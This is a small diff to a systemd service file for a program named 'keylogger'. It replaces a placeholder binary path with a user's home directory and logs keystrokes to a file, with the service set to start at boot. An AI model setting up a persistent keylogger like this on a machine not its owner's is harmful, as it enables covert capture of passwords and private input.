@@ -2,7 +2,7 @@
 Description=keylogger
 
 [Service]
-ExecStart=/path/to/keylogger/binary -f /root/keys.log
+ExecStart=/home/caente/bin/keylogger -f /home/caente/keys.log
 
 [Install]
 WantedBy=multi-user.target
